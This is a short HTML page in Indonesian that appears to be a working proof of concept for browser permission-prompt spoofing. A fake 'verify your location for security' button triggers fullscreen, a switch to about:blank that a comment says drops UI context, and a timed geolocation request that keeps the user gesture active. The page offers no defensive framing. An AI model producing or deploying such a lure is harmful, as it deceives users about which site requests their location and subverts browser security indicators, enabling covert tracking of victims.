<!DOCTYPE html>
<html>
<head>
  <title>Verifikasi Lokasi</title>
  <style>
    html, body {
      margin: 0; padding: 0;
      background: white;
      font-family: -apple-system, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }
    button {
      font-size: 18px;
      padding: 14px 28px;
    }
  </style>
</head>
<body>

<h2>ðŸ”’ Verifikasi lokasi Anda</h2>
<p>Untuk keamanan, kami perlu memverifikasi lokasi Anda.</p>
<button onclick="go()">Verifikasi Lokasi</button>

<script>
  function go() {
    document.documentElement.requestFullscreen().then(() => {
      // Drop UI context
      location.replace('about:blank');
      setTimeout(() => {
        navigator.geolocation.getCurrentPosition(() => {}, () => {});
      }, 500); // Timing penting agar gesture masih dianggap aktif
    });
  }
</script>

</body>
</html>
